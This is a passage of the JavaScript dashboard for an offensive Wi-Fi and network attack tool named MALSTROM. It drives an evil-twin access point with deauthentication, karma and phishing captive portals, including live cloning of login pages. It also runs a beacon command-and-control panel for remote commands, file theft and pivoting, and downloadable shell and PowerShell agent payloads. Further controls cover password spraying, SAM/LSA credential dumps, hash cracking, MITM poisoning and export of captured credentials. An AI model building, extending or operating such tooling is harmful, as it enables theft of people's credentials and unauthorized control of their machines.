    var lines = (active && active.term && active.term.length)
      ? active.term.map(function (t) {
          return '$ ' + (t.cmd || '') + '\n' + (t.out || '');
        }).join('\n')
      : '';
    var box = $('sess-term');
    if (!lines) { box.textContent = ''; return; }
    if (box.textContent !== lines) {
      box.textContent = lines;
      box.scrollTop = box.scrollHeight;
    }
  }

  function renderFileBrowser(active) {
    var out = $('sess-ls');
    var entries = active && active.tasks
      ? active.tasks.filter(function (t) { return t.kind === 'ls' && t.entries; })
          .slice(-1)[0]
      : null;
    if (!entries || !entries.entries.length) {
      out.innerHTML = '<div class="empty">Run a LIST to browse</div>';
      return;
    }
    var base = (entries.browse || '').replace(/\/$/, '');
    var rows = entries.entries.map(function (e) {
      var icon = e.dir ? '&#128193; ' : '&#128196; ';
      var gabtn = e.dir ? '' : ' <button class="btn" data-grab="' + esc(base + '/' + e.name) + '" style="padding:2px 8px;font-size:11px">GRAB</button>';
      return '<tr><td>' + icon + esc(e.name) + '</td><td>' + (e.link ? '&rarr; ' + esc(e.link) : '') +
        '</td><td>' + (e.dir ? '—' : esc(e.size)) + '</td><td>' + gabtn + '</td></tr>';
    }).join('');
    out.innerHTML = '<div class="tbl-wrap"><table class="cred-table"><thead><tr><th>Name</th><th>Link</th><th>Size</th><th></th></tr></thead><tbody>' +
      rows + '</tbody></table>' +
      '<div class="hint">Path: ' + esc(entries.browse) + ' &mdash; click a dir row name to drill in</div></div>';
    out.querySelectorAll('button[data-grab]').forEach(function (b) {
      b.addEventListener('click', function () {
        $('sess-file').value = b.getAttribute('data-grab');
        sendSessFile();
      });
    });
    out.querySelectorAll('td:first-child').forEach(function (td) {
      if (!(td.textContent || '').replace(/[^A-Za-z0-9._\/-]/g, '').length) return;
      td.style.cursor = 'pointer';
      td.addEventListener('click', function () {
        var name = td.textContent.replace(/^\S+ /, '').trim();
        if (!name) return;
        $('sess-ls-path').value = (base + '/' + name).replace(/\/+$/, '');
        apiGet('beacon_ls', { sid: sessSel, path: $('sess-ls-path').value.trim() });
        toast('Queueing listing of ' + $('sess-ls-path').value);
        opsPoll();
      });
    });
  }

  function renderPivots(active) {
    var fws = (active && active.fws) || [];
    var box = $('sess-fw-list');
    if (!fws.length) {
      box.innerHTML = '<div class="empty">No active forwards on this session</div>';
      return;
    }
    box.innerHTML = '<div class="tbl-wrap"><table class="cred-table"><thead><tr><th>Victim listener</th></tr></thead><tbody>' +
      fws.map(function (f) { return '<tr><td>' + esc(f) + '</td></tr>'; }).join('') +
      '</tbody></table></div>';
  }

  function sendSessCmd() {
    var sid = $('sess-select').value || sessSel;
    var cmd = $('sess-cmd').value.trim();
    if (!sid) { toast('No session selected', true); return; }
    if (!cmd) { toast('Type a command', true); return; }
    apiGet('beacon_cmd', { sid: sid, cmd: cmd }).then(function (r) {
      if (r.ok) { toast('Command queued to ' + sid); $('sess-cmd').value = ''; opsPoll(); }
      else toast('Queue failed: ' + (r.error || '?'), true);
    });
  }

  $('btn-scan-run').addEventListener('click', function () {
    var target = $('scan-target').value.trim();
    var kind = $('scan-kind').value;
    if (!target) { toast('Specify a target first', true); return; }
    $('scan-state').textContent = 'Running…';
    apiGet('scan_start', { target: target, kind: kind, range: $('scan-range').value || '1-1000' }).then(function (r) {
      if (r.ok) toast('Scan queued: ' + kind + ' ' + target);
      else { toast('Scan failed: ' + (r.error || '?'), true); $('scan-state').textContent = 'Idle'; }
      opsPoll();
    });
  });

  $('btn-scan-to-spray').addEventListener('click', function () {
    var done = null;
    ops.scans.forEach(function (s) { if (s.status === 'done' && (!done || s.started > done.started)) done = s; });
    if (!done || !done.hosts) { toast('No completed scan', true); return; }
    $('spray-targets').value = (done.hosts || []).map(function (h) { return h.ip; }).join(' ');
    setView('lateral');
    toast('Host list loaded into Lateral');
  });

  // --- Wi-Fi recon (live 802.11 AP picker) --------------------------------------

  function wifiSignal(sig) {
    if (sig === null || sig === undefined || isNaN(sig)) return '<span style="color:var(--dim)">—</span>';
    var color = sig >= -60 ? 'var(--green)' : (sig >= -75 ? 'var(--amber)' : 'var(--dim)');
    return '<span style="color:' + color + '">' + esc(sig) + ' dBm</span>';
  }

  function renderWifi() {
    var tb = $('tbl-wifi').querySelector('tbody');
    var q = ($('wifi-filter').value || '').trim().toLowerCase();
    var list = (wifi.aps || []).filter(function (ap) {
      if (!q) return true;
      return [ap.ssid, ap.bssid, ap.vendor, ap.security, String(ap.channel)]
        .some(function (v) { return String(v || '').toLowerCase().indexOf(q) >= 0; });
    });
    if (!list.length) {
      tb.innerHTML = '<tr><td colspan="9" class="empty">' +
        ((wifi.aps && wifi.aps.length)
          ? 'No AP matches the filter'
          : 'Run a scan to list nearby APs') + '</td></tr>';
      return;
    }
    tb.innerHTML = list.map(function (ap) {
      var flags = [];
      if (ap.wps) flags.push('WPS');
      if (ap.adhoc) flags.push('ADHOC');
      if (ap.ssid === '[hidden]') flags.push('HIDDEN');
      var ssid = esc(ap.ssid === '[hidden]' ? '' : (ap.ssid || ''));
      var bssid = esc(ap.bssid || '');
      var ch = esc(ap.channel || '6');
      return '<tr><td>' + esc(ap.ssid || '[hidden]') + '</td><td>' + esc(ap.bssid || '—') +
        '</td><td>' + esc(ap.vendor || '—') + '</td><td>' + esc(ap.channel || '?') +
        '</td><td>' + esc(ap.band || '—') + '</td><td>' + wifiSignal(ap.signal) +
        '</td><td>' + esc(ap.security || '—') + '</td><td>' +
        (flags.length ? esc(flags.join(' ')) : '—') + '</td>' +
        '<td style="white-space:nowrap">' +
        '<button class="btn" data-use="' + bssid + '" data-ssid="' + ssid +
        '" data-ch="' + ch + '" style="padding:4px 8px;font-size:11px">USE</button>' +
        '<button class="btn" data-harvest="passive" data-use="' + bssid +
        '" data-ssid="' + ssid + '" data-ch="' + ch +
        '" style="padding:4px 8px;font-size:11px;margin-left:4px">PASSIVE</button>' +
        '<button class="btn" data-harvest="active" data-use="' + bssid +
        '" data-ssid="' + ssid + '" data-ch="' + ch +
        '" style="padding:4px 8px;font-size:11px;margin-left:4px">ACTIVE</button>' +
        '</td></tr>';
    }).join('');
    tb.querySelectorAll('button[data-use]').forEach(function (b) {
      b.addEventListener('click', function () {
        $('cfg-ssid').value = b.getAttribute('data-ssid') || '';
        $('cfg-bssid').value = b.getAttribute('data-use') || '';
        $('cfg-channel').value = b.getAttribute('data-ch') || '6';
        markDirty('cfg-ssid'); markDirty('cfg-bssid'); markDirty('cfg-channel');
        setView('attack');
        toast('Target loaded from recon: ' +
              (b.getAttribute('data-ssid') || b.getAttribute('data-use')));
      });
    });
    tb.querySelectorAll('button[data-harvest]').forEach(function (b) {
      b.addEventListener('click', function () {
        harvest({
          ssid: b.getAttribute('data-ssid') || '',
          bssid: b.getAttribute('data-use') || '',
          channel: b.getAttribute('data-ch') || '6'
        }, b.getAttribute('data-harvest'));
      });
    });
  }

  function harvest(ap, mode) {
    if (!ap.ssid) { toast('Cannot harvest a hidden network without an SSID', true); return; }
    var active = (mode === 'active');
    var params = {
      ssid: ap.ssid,
      bssid: ap.bssid,
      channel: ap.channel,
      portal_mode: 'open',
      psk: '',
      clone_bssid: ap.bssid ? '1' : '0',
      wpa3_transition: '0',
      deauth_mode: active ? 'broadcast' : 'off',
      burst: '25',
      delay: '1',
      continuous: '1',
      template: $('cfg-template').value || 'wifi_login',
      capture_mode: 'both',
      karma: '1',
      shield_after_capture: '0'
    };
    apiGet('start', params).then(function (s) {
      if (s.ok) {
        toast('Harvest ' + mode + ' armed on ' + ap.ssid + ' (ch ' + ap.channel + ')');
        dirty = {};
        statusPoll();
      } else {
        toast('Harvest failed: ' + (s.error || '?'), true);
      }
    });
  }

  function runWifiScan() {
    if (wifi.running) { toast('Wi-Fi scan already running', true); return; }
    wifi.running = true;
    $('wifi-scan-state').textContent = 'Scanning… (managed scan, up to ~15s)';
    apiGet('scan').then(function (r) {
      wifi.running = false;
      if (r && r.ok) {
        wifi.aps = r.aps || [];
        wifi.iface = r.iface || '';
        wifi.ts = r.ts || '';
        $('wifi-scan-state').textContent =
          wifi.aps.length + ' APs via ' + (wifi.iface || '?') +
          (wifi.ts ? ' — ' + wifi.ts : '');
      } else {
        $('wifi-scan-state').textContent = 'Scan failed';
        toast('Wi-Fi recon failed: ' + ((r && r.error) || '?'), true);
      }
      renderWifi();
    });
  }
  $('btn-wifi-scan').addEventListener('click', runWifiScan);
  $('wifi-filter').addEventListener('input', renderWifi);

  // Rogue-subnet quick target: locks the nmap target onto the /24 the rogue
  // AP itself serves (victims connected to the portal).
  $('scan-rogue').addEventListener('change', function () {
    var t = $('scan-target');
    if (this.checked) {
      t.dataset.prev = t.value;
      t.value = (state && state.sys && state.sys.portal_net) || '172.16.52.0/24';
      t.disabled = true;
      toast('Target locked to the rogue subnet: ' + t.value);
    } else {
      t.disabled = false;
      if (typeof t.dataset.prev === 'string') t.value = t.dataset.prev;
    }
  });

  $('spray-cred').addEventListener('change', function () {
    $('spray-manual').style.display = (this.value === 'manual') ? '' : 'none';
  });

  $('btn-spray-run').addEventListener('click', function () {
    var protos = Array.prototype.map.call(document.querySelectorAll('.spray-proto:checked'),
      function (c) { return c.value; }).join(',') || 'smb';
    var params = {
      targets: $('spray-targets').value.trim(),
      protos: protos,
      limit: $('spray-limit').value || '15'
    };
    if ($('spray-cred').value === 'manual') {
      params.user = $('spray-user').value.trim();
      params.pass = $('spray-pass').value.trim();
    }
    if (!params.targets) { toast('Set spray targets (CIDR or IPs)', true); return; }
    $('spray-state').textContent = 'Spraying…';
    apiGet('spray', params).then(function (r) {
      if (r.ok) toast('Spray queued: ' + r.attempts + ' attempts');
      else { toast('Spray failed: ' + (r.error || '?'), true); $('spray-state').textContent = 'Idle'; }
      opsPoll();
    });
  });

  // --- SAM/LSA dump + hash crack -----------------------------------------------
  $('btn-dump-run').addEventListener('click', function () {
    var kind = document.querySelector('input[name="dump-kind"]:checked');
    var params = {
      targets: $('spray-targets').value.trim(),
      kind: (kind && kind.value) || 'sam'
    };
    if ($('spray-cred').value === 'manual') {
      params.user = $('spray-user').value.trim();
      params.pass = $('spray-pass').value.trim();
    }
    if (!params.targets) { toast('Set Lateral targets first (CIDR or IPs)', true); return; }
    $('dump-state').textContent = 'Dumping…';
    apiGet('dump', params).then(function (r) {
      if (r.ok) toast(params.kind.toUpperCase() + ' dump queued: ' + params.targets);
      else { toast('Dump failed: ' + (r.error || '?'), true); $('dump-state').textContent = 'Idle'; }
      opsPoll();
    });
  });

  $('btn-crack-run').addEventListener('click', function () {
    $('crack-state').textContent = 'hashcat running against the vault…';
    apiGet('crack').then(function (r) {
      if (r.ok) toast('Hash crack queued — results land in the vault');
      else { toast('Crack failed: ' + (r.error || '?'), true); $('crack-state').textContent = 'hashcat against the vault (NTLMv2 + NT)'; }
      opsPoll();
    });
  });

  $('btn-mitm').addEventListener('click', function () {
    var on = !!ops.mitm.running;
    var params = { on: on ? '0' : '1' };
    apiGet('mitm', params).then(function (r) {
      if (r.ok) toast(on ? 'Poisoning disarmed' : 'Poisoning armed — hashes incoming');
      else toast('MITM toggle failed: ' + (r.error || '?'), true);
      opsPoll();
    });
  });

  function copyText(txt) {
    if (navigator.clipboard && navigator.clipboard.writeText) {
      return navigator.clipboard.writeText(txt).then(function () { toast('Copied to clipboard'); });
    }
    var ta = document.createElement('textarea');
    ta.value = txt;
    document.body.appendChild(ta);
    ta.select();
    try { document.execCommand('copy'); toast('Copied to clipboard'); } catch (e) { toast('Copy failed', true); }
    ta.remove();
  }

  $('cfg-beacon').addEventListener('change', function () {
    apiGet('beacon', { on: this.checked ? '1' : '0' }).then(function (r) {
      if (r.ok) { toast(r.on ? 'Beacon armed — serve /beacon to a target' : 'Beacon disarmed'); opsPoll(); }
      else toast('Beacon toggle failed: ' + (r.error || '?'), true);
    });
  });

  $('btn-copy-sh').addEventListener('click', function () {
    fetch(API + '?' + qs({ action: 'beacon_payload', token: session.sid || '', kind: 'sh' }))
      .then(function (r) { return r.text(); }).then(copyText);
  });
  $('btn-copy-ps1').addEventListener('click', function () {
    fetch(API + '?' + qs({ action: 'beacon_payload', token: session.sid || '', kind: 'ps1' }))
      .then(function (r) { return r.text(); }).then(copyText);
  });
  $('btn-dl-sh').addEventListener('click', function () {
    downloadUrl(API + '?' + qs({ action: 'beacon_payload', token: session.sid || '', kind: 'sh' }), 'malstrom-agent.sh');
  });
  $('btn-dl-ps1').addEventListener('click', function () {
    downloadUrl(API + '?' + qs({ action: 'beacon_payload', token: session.sid || '', kind: 'ps1' }), 'malstrom-agent.ps1');
  });
  $('btn-sess-cmd').addEventListener('click', sendSessCmd);
  $('sess-cmd').addEventListener('keydown', function (e) { if (e.key === 'Enter') sendSessCmd(); });
  $('sess-select').addEventListener('change', renderSessions);

  function sendSessFile() {
    var sid = $('sess-select').value || sessSel;
    var path = $('sess-file').value.trim();
    if (!sid) { toast('No session selected', true); return; }
    if (!path) { toast('Type a remote path', true); return; }
    apiGet('beacon_file', { sid: sid, path: path }).then(function (r) {
      if (r.ok) { toast('File grab queued to ' + sid); $('sess-file').value = ''; opsPoll(); }
      else toast('Grab failed: ' + (r.error || '?'), true);
    });
  }
  $('btn-sess-file').addEventListener('click', sendSessFile);
  $('sess-file').addEventListener('keydown', function (e) { if (e.key === 'Enter') sendSessFile(); });

  // C5: terminal / file browser / pivot -----------------------------------------
  function sendTermCmd() {
    var sid = $('sess-select').value || sessSel;
    var cmd = $('sess-term-cmd').value.trim();
    if (!sid) { toast('No session selected', true); return; }
    if (!cmd) { toast('Type a command', true); return; }
    apiGet('beacon_termcmd', { sid: sid, cmd: cmd }).then(function (r) {
      if (r.ok) { $('sess-term-cmd').value = ''; opsPoll(); }
      else toast('Queue failed: ' + (r.error || '?'), true);
    });
  }
  $('btn-sess-term-cmd').addEventListener('click', sendTermCmd);
  $('sess-term-cmd').addEventListener('keydown', function (e) { if (e.key === 'Enter') sendTermCmd(); });
  $('cfg-term').addEventListener('change', function () {
    var sid = $('sess-select').value || sessSel;
    if (!sid) { toast('No session selected', true); this.checked = false; return; }
    apiGet('beacon_term', { sid: sid, on: this.checked ? '1' : '0' }).then(function (r) {
      if (r.ok) { toast('Terminal ' + (r.on ? 'on' : 'off')); opsPoll(); }
      else toast('Toggle failed: ' + (r.error || '?'), true);
    });
  });
  function sendSessLs() {
    var sid = $('sess-select').value || sessSel;
    var path = $('sess-ls-path').value.trim();
    if (!sid) { toast('No session selected', true); return; }
    if (!path) { toast('Enter a path', true); return; }
    apiGet('beacon_ls', { sid: sid, path: path }).then(function (r) {
      if (r.ok) { toast('Listing queued: ' + path); opsPoll(); }
      else toast('List failed: ' + (r.error || '?'), true);
    });
  }
  $('btn-sess-ls').addEventListener('click', sendSessLs);
  $('sess-ls-path').addEventListener('keydown', function (e) { if (e.key === 'Enter') sendSessLs(); });
  function sendSessFw() {
    var sid = $('sess-select').value || sessSel;
    var spec = $('sess-fw').value.trim();
    if (!sid) { toast('No session selected', true); return; }
    if (!spec) { toast('Enter a spec like 8080-192.168.1.50:80', true); return; }
    apiGet('beacon_fwd', { sid: sid, spec: spec }).then(function (r) {
      if (r.ok) { $('sess-fw').value = ''; toast('Pivot queued to ' + sid); opsPoll(); }
      else toast('Pivot failed: ' + (r.error || '?'), true);
    });
  }
  $('btn-sess-fw').addEventListener('click', sendSessFw);
  $('sess-fw').addEventListener('keydown', function (e) { if (e.key === 'Enter') sendSessFw(); });

  // --- SSE log stream ---------------------------------------------------------
  function openStream() {
    var es = new EventSource(API + '?action=events&token=' + (session.sid || ''));
    es.onmessage = function (ev) {
      var line;
      try { line = JSON.parse(ev.data); } catch (e) { return; }
      appendLog(line);
    };
    es.onerror = function () {
      es.close();
      setTimeout(openStream, 2500);
    };
  }

  function appendLog(line) {
    var box = $('log-stream');
    var lg = line.line ? JSON.parse(line.line) : line;
    var t = lg.ts || '';
    var m = lg.msg || '';
    var type = lg.type || 'INFO';
    var div = document.createElement('div');
    div.className = 'logline ' + type;
    div.innerHTML = '<span class="t">[' + t + ']</span> <span class="m"></span>';
    div.querySelector('.m').textContent = m;
    box.appendChild(div);
    while (box.childNodes.length > 300) box.removeChild(box.firstChild);
    box.scrollTop = box.scrollHeight;
    if (type === 'ALERT') {
      $('nav-alerts').textContent = '!';
      toast('ALERT: ' + m, true);
    }
    if (type === 'CRED' || type === 'HANDSHAKE' || type === 'PMKID' ||
        type === 'VERIFY' || type === 'CRACK') { lootPoll(); alertsPoll(); }
    if (type === 'OWNED' || type === 'HASH' || type === 'SCAN' || type === 'MITM' || type === 'PROG' || type === 'SESS') { opsPoll(); }
  }

  // --- settings ---------------------------------------------------------------
  function renderSettings(s) {
    if (!s || !s.ok) return;
    $('set-lan-url').value = s.lan_url || '';
    $('set-token').value = s.token || '';
    $('set-key').value = s.key || '';
    setCheck('set-auth-gate', !!s.auth_enabled);
    $('set-auth-hint').textContent = s.auth_enabled
      ? 'Token-gated — sign-in required (new sessions need the dashboard password)'
      : 'Open — anyone can open the dashboard (auth gate off, no restart needed)';
    if (s.settings) {
      $('set-beacon-int').value = s.settings.beacon_interval;
      $('set-beacon-maxout').value = s.settings.beacon_maxout;
      $('set-scan-range').value = s.settings.scan_range;
      $('set-spray-limit').value = s.settings.spray_limit;
      $('set-mitm-iface').value = s.settings.mitm_iface;
      $('set-wlan-dev').value = s.settings.wlan_dev || '';
      $('set-crack-wordlist').value = s.settings.crack_wordlist || '';
      $('set-portal-ssid').value = s.settings.portal_ssid || '';
    }
    var rows = [];
    if (s.runtime) {
      rows.push(['MALSTROM version', s.runtime.version]);
      rows.push(['State dir', s.runtime.state_dir]);
      rows.push(['Loot dir', s.runtime.loot_dir]);
      rows.push(['Nmap binary', s.runtime.scan_bin]);
      rows.push(['NetExec binary', s.runtime.netexec_bin]);
      rows.push(['Responder binary', s.runtime.responder_bin]);
    }
    if (s.portal_ip) rows.push(['Rogue portal', s.portal_ip + ':' + s.portal_port]);
    var tb = $('tbl-runtime').querySelector('tbody');
    tb.innerHTML = rows.map(function (r) {
      return '<tr><td>' + esc(r[0]) + '</td><td><code>' + esc(r[1]) + '</code></td></tr>';
    }).join('') || '<tr><td colspan="2" class="empty">n/a</td></tr>';
  }

  function pollSettings() {
    apiGet('settings').then(renderSettings);
  }

  $('btn-copy-token').addEventListener('click', function () {
    var t = $('set-token').value;
    if (!t) { toast('No password set', true); return; }
    copyText(t);
  });

  $('btn-rotate-key').addEventListener('click', function () {
    if (!confirm('Rotate the beacon key? Agents with the old key will be orphaned.')) return;
    apiGet('key_rotate').then(function (s) {
      if (s.ok) {
        $('set-key').value = s.key;
        $('set-key-msg').textContent = 'Rotated — serve fresh payloads to existing sessions.';
        opsPoll();
      } else {
        toast('Rotation failed: ' + (s.error || '?'), true);
      }
    });
  });

  // A pending (unsaved) gate flip must survive the 6.5s settings poll — mark
  // it dirty until SAVE applies server truth; the save handler clears it.
  $('set-auth-gate').addEventListener('change', function () {
    markDirty('set-auth-gate');
  });

  $('btn-save-settings').addEventListener('click', function () {
    var params = {};
    var fields = ['beacon_interval', 'beacon_maxout', 'scan_range', 'spray_limit', 'mitm_iface', 'wlan_dev', 'crack_wordlist'];
    $('set-save-msg').textContent = '';
    ['set-beacon-int', 'set-beacon-maxout', 'set-scan-range', 'set-spray-limit', 'set-mitm-iface', 'set-wlan-dev', 'set-crack-wordlist'].forEach(function (id, i) {
      if ($(id).value.trim() !== '') params[fields[i]] = $(id).value.trim();
    });
    params.portal_ssid = $('set-portal-ssid').value.trim();
    params.auth_enabled = $('set-auth-gate').checked ? '1' : '0';
    apiGet('settings_set', params).then(function (s) {
      if (s.ok) {
        toast('Settings saved');
        $('set-save-msg').textContent = 'Saved.';
        if (s.settings) {
          $('set-portal-ssid').value = s.settings.portal_ssid || '';
          $('set-beacon-int').value = s.settings.beacon_interval;
          $('set-beacon-maxout').value = s.settings.beacon_maxout;
          $('set-scan-range').value = s.settings.scan_range;
          $('set-spray-limit').value = s.settings.spray_limit;
          $('set-mitm-iface').value = s.settings.mitm_iface;
          $('set-wlan-dev').value = s.settings.wlan_dev || '';
          $('set-crack-wordlist').value = s.settings.crack_wordlist || '';
        }
        if (typeof s.auth_enabled !== 'undefined') {
          delete dirty['set-auth-gate'];
          setCheck('set-auth-gate', !!s.auth_enabled);
          $('set-auth-hint').textContent = s.auth_enabled
            ? 'Token-gated — sign-in required (new sessions need the dashboard password)'
            : 'Open — anyone can open the dashboard (auth gate off, no restart needed)';
          if (s.auth_enabled) {
            // Enabling the gate wipes every session server-side — including
            // ours. Show the login screen immediately instead of leaving a
            // dead dashboard that just toasts 'auth required' every poll.
            showAuthGate('Auth gate ENABLED — your session was closed. '
                       + 'Re-enter the dashboard password to continue.');
          }
        }
      } else {
        $('set-save-msg').textContent = (s.error || 'failed');
        toast('Save failed: ' + (s.error || '?'), true);
      }
    });
  });

  // --- actions ----------------------------------------------------------------
  function start() {
    var params = {
      ssid: $('cfg-ssid').value.trim(),
      bssid: $('cfg-bssid').value.trim(),
      channel: $('cfg-channel').value || '6',
      portal_mode: $('cfg-portal-mode').value,
      psk: $('cfg-psk').value.trim(),
      clone_bssid: $('cfg-clone-bssid').checked ? '1' : '0',
      beacon_rotate: $('cfg-rotate').value || '0',
      ssid_cloak: $('cfg-cloak').checked ? '1' : '0',
      wpa3_transition: $('cfg-wpa3').checked ? '1' : '0',
      deauth_mode: $('cfg-deauth').value,
      burst: $('cfg-burst').value || '25',
      delay: $('cfg-delay').value || '1',
      continuous: $('cfg-continuous').checked ? '1' : '0',
      template: $('cfg-template').value,
      capture_mode: $('cfg-capture').value,
      karma: $('cfg-karma').checked ? '1' : '0',
      karma_respond: $('cfg-karma-respond').checked ? '1' : '0',
      relay: $('cfg-relay').checked ? '1' : '0',
      shield_after_capture: $('cfg-shield').checked ? '1' : '0'
    };
    if (!params.ssid) { toast('Specify a target SSID first', true); return; }
    apiGet('start', params).then(function (s) {
      if (s.ok) { toast('Kill chain armed: ' + params.ssid); dirty = {}; statusPoll(); }
      else toast('Arm failed: ' + (s.error || '?'), true);
    });
  }
  $('btn-start').addEventListener('click', start);

  $('btn-autopwn').addEventListener('click', function () {
    var on = !autopwn.auto_harvest;
    apiGet('autopwn', { on: on ? '1' : '0' }).then(function (r) {
      if (r && r.ok) {
        toast(on ? 'Auto harvest armed' : 'Auto harvest disarmed');
        statusPoll();
      } else {
        toast('Auto harvest toggle failed: ' + (r && r.error || '?'), true);
      }
    });
  });

  $('btn-disarm').addEventListener('click', function () {
    apiGet('disarm').then(function (s) {
      if (s.ok) { toast('Kill chain disarmed'); statusPoll(); }
      else toast('Disarm failed', true);
    });
  });

  $('btn-cleanup').addEventListener('click', function () {
    if (!confirm('Full cleanup? Restores your AP config, stops portal + deauth.')) return;
    apiGet('cleanup').then(function (s) {
      if (s.ok) { toast('Cleanup complete — original config restored'); statusPoll(); }
      else toast('Cleanup failed: ' + (s.error || '?'), true);
    });
  });

  $('btn-loot-clear').addEventListener('click', function () {
    if (!confirm('Clear all loot? Wipes captured creds, devices, handshakes, probes, hashes and pcaps on-device. Pinned items are kept.')) return;
    apiGet('loot_clear').then(function (s) {
      if (s.ok) { toast('Loot vault cleared'); lootPoll(); statusPoll(); }
      else toast('Clear failed: ' + (s.error || '?'), true);
    });
  });

  $('btn-whitelist-clear').addEventListener('click', function () {
    if (!confirm('Clear the whitelist? Every shielded client is served the portal again on its next request (already-connected ones right away, once the engine syncs the firewall).')) return;
    apiGet('whitelist_clear').then(function (s) {
      if (s.ok) { toast('Whitelist cleared — portal served to everyone again'); statusPoll(); }
      else toast('Clear failed: ' + (s.error || '?'), true);
    });
  });

  $('btn-reset-stock').addEventListener('click', function () {
    if (!confirm('Reset to stock? Clears scans, loot, target state and events. Keeps portal templates, whitelist, settings, pinned items and auth.')) return;
    apiGet('reset_stock').then(function (s) {
      if (s.ok) {
        toast('MALSTROM reset to stock — portals kept');
        $('reset-msg').textContent = 'Reset complete.';
        dirty = {};
        statusPoll();
        lootPoll();
        opsPoll();
        alertsPoll();
      } else {
        toast('Reset failed: ' + (s.error || '?'), true);
      }
    });
  });

  $('btn-reset-tool').addEventListener('click', function () {
    if (!confirm('Factory reset MALSTROM? Wipes loot, target state, whitelist, settings and custom templates. The dashboard password is kept.')) return;
    apiGet('reset').then(function (s) {
      if (s.ok) {
        toast('MALSTROM reset to factory defaults');
        $('reset-msg').textContent = 'Reset complete.';
        dirty = {};
        loadTemplates();
        statusPoll();
        lootPoll();
        opsPoll();
        alertsPoll();
      } else {
        toast('Reset failed: ' + (s.error || '?'), true);
      }
    });
  });

  $('btn-scan').addEventListener('click', function () {
    // The crude prompt() picker is gone — jump to the Recon tab and run a live
    // scan; USE a row there to load the target into this form.
    setView('recon');
    runWifiScan();
  });

  $('cfg-portal-mode').addEventListener('change', function () {
    var wpa = (this.value === 'wpa');
    $('psk-wrap').style.display = wpa ? '' : 'none';
    $('wpa3-wrap').style.display = wpa ? '' : 'none';
  });

  // templates + preview -------------------------------------------------------
  function loadTemplates() {
    apiGet('templates').then(function (t) {
      if (!t.ok) return;
      templates = t.templates || [];
      if (templates.indexOf('wifi_login') < 0) templates.unshift('wifi_login');
      var sel = $('cfg-template');
      var options = ['<option value="auto">Auto (OS-adaptive)</option>'];
      sel.innerHTML = options.concat(templates.map(function (n) {
        return '<option value="' + n + '">' + n + '</option>';
      })).join('');
    });
  }

  $('btn-preview').addEventListener('click', function () {
    var name = $('cfg-template').value || 'wifi_login';
    apiGet('template', { name: name === 'auto' ? 'wifi_login' : name }).then(function (t) {
      if (t.html) {
        $('modal-iframe').srcdoc = t.html;
        $('modal').classList.add('show');
      }
    });
  });
  $('modal-close').addEventListener('click', function () { $('modal').classList.remove('show'); });

  // template upload -------------------------------------------------------------
  $('btn-upload-tpl').addEventListener('click', function () {
    $('file-tpl').value = '';
    $('file-tpl').click();
  });
  $('file-tpl').addEventListener('change', function () {
    var f = this.files && this.files[0];
    if (!f) return;
    var reader = new FileReader();
    reader.onload = function () {
      var name = f.name.replace(/\.(html?|txt)$/i, '').trim() || 'custom';
      fetch(API + '?' + qs({ action: 'save_template', token: session.sid || '' }), {
        method: 'POST',
        credentials: 'same-origin',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: qs({ name: name, html: reader.result || '' })
      }).then(function (r) { return r.json(); }).then(function (s) {
        if (s.ok) { toast('Template "' + name + '" stored'); loadTemplates(); }
        else toast('Upload failed: ' + (s.error || '?'), true);
      });
    };
    reader.readAsText(f);
  });

  // live page clone ------------------------------------------------------------
  $('btn-clone-page').addEventListener('click', function () {
    var url = $('clone-url').value.trim();
    if (!url) { toast('Enter a URL to clone', true); return; }
    $('btn-clone-page').disabled = true;
    apiGet('clone_page', { url: url }).then(function (s) {
      $('btn-clone-page').disabled = false;
      if (s && s.ok) {
        toast('Cloned -> template "' + s.name + '" (activated)');
        loadTemplates();
      } else toast('Clone failed: ' + ((s && s.error) || '?'), true);
    });
  });

  // loot tabs + exports ----------------------------------------------------------
  document.querySelectorAll('.loot-tabs .tab').forEach(function (b) {
    b.addEventListener('click', function () {
      document.querySelectorAll('.loot-tabs .tab').forEach(function (x) { x.classList.toggle('active', x === b); });
      switchLootTab(b.getAttribute('data-tab'));
    });
  });

  $('btn-export-csv').addEventListener('click', function () {
    var url = API + '?' + qs({ action: 'export_csv', token: session.sid || '', kind: lootTab });
    downloadUrl(url, 'malstrom_' + lootTab + '.csv');
  });

  $('btn-export-json').addEventListener('click', function () {
    var blob = new Blob([JSON.stringify(loot.creds, null, 2)], { type: 'application/json' });
    downloadBlob(blob, 'malstrom_creds.json');
  });

  // --- boot -------------------------------------------------------------------
  function boot() {
    if (booted) return;
    booted = true;
    setView('dashboard');
    loadTemplates();
    statusPoll();
    lootPoll();
    opsPoll();
    alertsPoll();
    openStream();
    pollSettings();
    dashboardPoll();
    setInterval(statusPoll, 2500);
    setInterval(lootPoll, 4000);
    setInterval(opsPoll, 3500);
    setInterval(alertsPoll, 5000);
    setInterval(pollSettings, 6500);
    setInterval(dashboardPoll, 4000);
    // operator-presence heartbeat: the daemon in app mode (desktop icon) stops
    // itself once this stops arriving, i.e. when the dashboard is closed.
    setInterval(function () { apiGet('ping', {}); }, 15000);
  }
})();